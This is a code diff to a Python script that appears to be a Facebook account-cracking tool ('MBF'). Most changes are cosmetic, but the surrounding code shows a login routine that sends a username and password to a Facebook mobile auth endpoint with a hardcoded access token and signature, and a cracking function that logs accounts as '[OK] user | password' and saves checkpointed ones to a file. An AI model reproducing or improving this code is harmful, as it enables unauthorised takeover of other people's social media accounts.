@@ -38,8 +38,8 @@ def banner():
           *   *  /+/++//
            \ /  |/___//
          {X}v{X}| MBF|>>>>>>>>>>+.
-           [']  /'|'\           \\
-          \rm     /  \  \           '
+           [']  /'|'\             \\
+          \rm     /  \  \             '
                \_  \_ \_  
      \rw     Created by \raIqbal Dev
      \rw+==============================+
@@ -49,8 +49,8 @@ def banner():
 
 def login():
     banner()
-    user_name = raw_input(p+"  [log]" + a + " Username" + pu + ":")
-    password = raw_input(p+"  [log]" + a + " Password" + pu + ":")
+    user_name = raw_input(p+"  [log]" + a + " Username" + pu + ": ")
+    password = raw_input(p+"  [log]" + a + " Password" + pu + ": ")
     req = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+user_name+'&locale=en_US&password='+password+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
     
     dev = req.content
@@ -142,6 +142,8 @@ def mbfcrack():
                 sukses.close()
                 dados.append(h+" [OK] " + pu + user + " | " + a + password)
                 count += 1
+            if count == len(baris):
+                break
             else:
                 if "www.facebook" in jsl["error_msg"]:
                     cekpo = open("cekpoint.txt", "w")
